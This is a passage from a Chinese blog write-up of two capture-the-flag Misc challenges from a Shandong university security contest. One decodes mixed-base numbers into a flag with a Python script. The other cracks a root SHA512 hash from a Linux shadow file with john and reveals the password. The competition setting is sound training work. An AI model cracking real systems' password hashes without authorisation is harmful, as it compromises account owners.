<h3 id="Misc-进制转换"><a href="#Misc-进制转换" class="headerlink" title="Misc-进制转换"></a>Misc-进制转换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e</span><br></pre></td></tr></table></figure>
<p>将其转换为十进制然后转换为字符拼接即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">f = open(<span class="string">"text.txt"</span>).read()</span><br><span class="line">listf =f.split(<span class="string">" "</span>)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> listf:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"d"</span> <span class="keyword">in</span> i[<span class="number">0</span>:<span class="number">1</span>]:</span><br><span class="line">        flag += chr(int(i.replace(<span class="string">"d"</span>,<span class="string">""</span>)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"x"</span> <span class="keyword">in</span> i[<span class="number">0</span>:<span class="number">1</span>]:</span><br><span class="line">        flag += chr(int(i.replace(<span class="string">"x"</span>,<span class="string">""</span>),<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"b"</span> <span class="keyword">in</span> i[<span class="number">0</span>:<span class="number">1</span>]:</span><br><span class="line">        flag += chr(int(i.replace(<span class="string">"b"</span>,<span class="string">""</span>),<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"o"</span> <span class="keyword">in</span> i[<span class="number">0</span>:<span class="number">1</span>]:</span><br><span class="line">        flag += chr(int(i.replace(<span class="string">"o"</span>,<span class="string">""</span>),<span class="number">8</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<h3 id="Misc-Crack-it"><a href="#Misc-Crack-it" class="headerlink" title="Misc-Crack it"></a>Misc-Crack it</h3><p>下载后发现是个<code>shadow</code>文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:17770:0:99999:7:::</span><br></pre></td></tr></table></figure>
<blockquote>
<p>id为1时，采用md5进行加密；</p>
<p>id为5时，采用SHA256进行加密；</p>
<p>id为6时，采用SHA512进行加密。</p>
</blockquote>
<p>那这里很明显就是用的SHA512进行加密了</p>
<p>详细的shadow文件解析请参考</p>
<p><code>https://blog.csdn.net/jinyuhongye/article/details/7950961</code></p>
<p>对于这种直接用<code>john</code>工具进行破解</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# john -show shadow </span><br><span class="line">root:hellokitty:17770:0:99999:7:::</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure>
<p>root用户的密码为<code>hellokitty</code></p>
<p>写在最后，以后不想做图片隐写和其他的乱七八糟的Misc题了，在以后的CTF比赛里，只做Web、Bin(刚刚开始二进制方向的学习)、流量分析</p>
  
	</div>
		<footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/山东省大学生信息安全竞赛/">山东省大学生信息安全竞赛</a><a href="/tags/科来杯/">科来杯</a>
  </div>

</div>



	<div class="article-share" id="share">
	
	  <div data-url="http://flag0.com/2018/11/08/第七届山东省大学生信息安全竞赛Writeup/" data-title="第七届山东省信息安全竞赛Writeup | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
	  </div>
	
	</div>


</footer>

   	       
	</article>
	
<nav class="article-nav clearfix">
 
 <div class="prev" >
 <a href="/2018/11/11/浅析SSTI-python沙盒绕过/" title="浅析SSTI(python沙盒绕过)">
  <strong>上一篇：</strong><br/>
  <span>
  浅析SSTI(python沙盒绕过)</span>
</a>
</div>


<div class="next">
<a href="/2018/09/15/AWD流量混淆/"  title="AWD流量混淆">
 <strong>下一篇：</strong><br/> 
 <span>AWD流量混淆
</span>
</a>
</div>

</nav>

	



</div>  
      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>

  <div id="toc" class="toc-aside">
  <strong class="toc-title">Contents</strong>
 
 <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-铜牌-1-babyWeb"><span class="toc-number">1.</span> <span class="toc-text">Web-铜牌-1:babyWeb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-铜牌-3-babyWeb2"><span class="toc-number">2.</span> <span class="toc-text">Web-铜牌-3:babyWeb2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-银牌1-easy-flask"><span class="toc-number">3.</span> <span class="toc-text">Web-银牌1-easy_flask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forensic-日志分析"><span class="toc-number">4.</span> <span class="toc-text">Forensic-日志分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forensic-weblogic"><span class="toc-number">5.</span> <span class="toc-text">Forensic-weblogic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forensic-特殊后门"><span class="toc-number">6.</span> <span class="toc-text">Forensic-特殊后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forensic-PC木马"><span class="toc-number">7.</span> <span class="toc-text">Forensic-PC木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stego-啊哒"><span class="toc-number">8.</span> <span class="toc-text">Stego-啊哒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto-affine"><span class="toc-number">9.</span> <span class="toc-text">Crypto-affine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc-basic"><span class="toc-number">10.</span> <span class="toc-text">Misc-basic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc-进制转换"><span class="toc-number">11.</span> <span class="toc-text">Misc-进制转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc-Crack-it"><span class="toc-number">12.</span> <span class="toc-text">Misc-Crack it</span></a></li></ol>
 
  </div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
<aside class="clearfix">

  
<div class="categorieslist">
	<p class="asidetitle">分类</p>
		<ul>
		
		  
			<li><a href="/categories/安全竞赛/" title="安全竞赛">安全竞赛<sup>24</sup></a></li>
		  
		
		  
			<li><a href="/categories/编程开发/" title="编程开发">编程开发<sup>16</sup></a></li>
		  
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">标签</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/docker/" title="docker">docker<sup>6</sup></a></li>
			
		
			
				<li><a href="/tags/Writeup/" title="Writeup">Writeup<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/python/" title="python">python<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/redis/" title="redis">redis<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/山东省大学生信息安全竞赛/" title="山东省大学生信息安全竞赛">山东省大学生信息安全竞赛<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/汇编/" title="汇编">汇编<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/学习笔记/" title="学习笔记">学习笔记<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/安恒杯Web安全测试大赛/" title="安恒杯Web安全测试大赛">安恒杯Web安全测试大赛<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/AWD/" title="AWD">AWD<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/Docker/" title="Docker">Docker<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/自动化/" title="自动化">自动化<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/攻击脚本/" title="攻击脚本">攻击脚本<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/流量混淆/" title="流量混淆">流量混淆<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/XAMPP/" title="XAMPP">XAMPP<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/error/" title="error">error<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/cve-2019-0708/" title="cve_2019_0708">cve_2019_0708<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/msf/" title="msf">msf<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/Jenkins/" title="Jenkins">Jenkins<sup>1</sup></a></li>
			
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">友情链接</p>
    <ul>
        
          <li>
            
            	<a href="http://www.cnblogs.com/test404" target="_blank" title="胖虎">胖虎</a>
            
          </li>
        
          <li>
            
            	<a href="http://p0desta.com" target="_blank" title="p0desta">p0desta</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.test407.cn" target="_blank" title="薯片博客">薯片博客</a>
            
          </li>
        
          <li>
            
            	<a href="https://alem0n.github.io" target="_blank" title="lem0n">lem0n</a>
            
          </li>
        
    </ul>
</div>

</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	
	<section class="info">
		<p> Rise and rise again until lambs become lions <br/>
			Everyone can cook, but only those who dare to try can become the real chef.</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		
		<a href="https://github.com/flag0" target="_blank" class="icon-github" title="github"></a>
		
		
		
		
		
		
		
		
		
		<a href="mailto:root@flag0.com" target="_blank" class="icon-email" title="Email Me"></a>
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2019 
		
		<a href="/about" target="_blank" title="GetFlag">GetFlag</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
      
      $('#toc.toc-aside').css('display', 'none');
        
    }
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){ 
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  c.click(function(){
    ta.css('display', 'block').addClass('fadeIn');
  });
  o.click(function(){
    ta.css('display', 'none');
  });
  $(window).scroll(function(){
    ta.css("top",Math.max(140,320-$(this).scrollTop()));
  });
});
</script>


<script type="text/javascript">
$(document).ready(function(){ 
  var $this = $('.share'),
      url = $this.attr('data-url'),
      encodedUrl = encodeURIComponent(url),
      title = $this.attr('data-title'),
      tsina = $this.attr('data-tsina'),
      description = $this.attr('description');
  var html = [
  '<div class="hoverqrcode clearfix"></div>',
  '<a class="overlay" id="qrcode"></a>',
  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
  '<span title="Share to"></span>'
  ].join('');
  $this.append(html);

  $('.hoverqrcode').hide();

  var myWidth = 0;
  function updatehoverqrcode(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
    var qrsize = myWidth > 1024 ? 200:100;
    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
    var p = $('.article-share-qrcode').position();
    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
                          .qrcode(options);
  };
  $(window).resize(function(){
    $('.hoverqrcode').hide();
  });
  $('.article-share-qrcode').click(function(){
    updatehoverqrcode();
    $('.hoverqrcode').toggle();
  });
  $('.article-share-qrcode').hover(function(){}, function(){
      $('.hoverqrcode').hide();
  });
});   
</script>











<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->





<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  </body>
</html>
